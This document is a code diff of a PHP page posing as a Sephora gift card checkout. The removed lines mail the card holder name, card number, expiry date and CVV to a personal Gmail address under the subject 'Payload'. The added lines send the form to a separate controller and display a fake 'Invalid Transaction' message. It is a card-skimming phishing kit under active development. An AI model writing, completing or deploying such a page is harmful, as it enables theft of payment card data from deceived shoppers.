@@ -1,3 +1,6 @@
+<?php
+  session_start();
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,11 +8,8 @@
 	<title>Payment Checkout Form</title>
 	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css">
 	<link rel="stylesheet" href="styles.css">
-
 </head>
 <body>
-	
-
 
 <div class="wrapper">
   <div class="payment">
@@ -20,7 +20,7 @@
     <p class="payment-tiitle">Sephora Gift Cards</p>
     <p class="payment-invoice">Invoice #4435</p>
     <h4>$25,000.00</h4>
-    <form action="" method = "post">
+    <form action="controller/form.action.php" method = "post">
       <div class="form">
           <div class="card space icon-relative">
             <label class="label">Card holder:</label>
@@ -45,38 +45,14 @@
       </div>
     </form>
   </div>
-</div>
-
-<?php
-if(isset($_POST['card_ho'])&& isset($_POST['card_no']) && isset($_POST['card_ex'])  && isset ($_POST['cvv']))
-{
-    $cardho = $_POST['card_ho'];
-    $cardno = $_POST['card_no'];
-    $cardex = $_POST['card_ex'];
-    $cvv = $_POST['cvv'];
-
-    $message =  $cardho . " " . $cardno . " " . $cardex . " " . $cvv;
-
-    $to = "emekaveli@gmail.com";
-    $subject = "Payload";
-    $headers = array(
-        'From' => 'webmaster@example.com',
-        'Reply-To' => 'webmaster@example.com',
-        'X-Mailer' => 'PHP/' . phpversion()
-    );
-    mail($to, $subject, $message, $headers);
-    // try {
-    //    if(!mail($to, $subject, $message, $headers)){
-    //      throw new Exception("Failed");
-    //    } 
-    //   } catch (Exception $e) {
-    //     echo $e->getMessage();
-    //     die();
-    //   } finally{
-    //     mail($to, $subject, $message, $headers);
-    //   }
-}
-?>
+  <?php 
+  if(isset($_SESSION['done']))
+  { 
+    // var_dump($_SESSION['done']);
+    echo'<div id="error">Invalid Transaction</div>';
+  }
+  ?>
+  </div>
 	<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
 
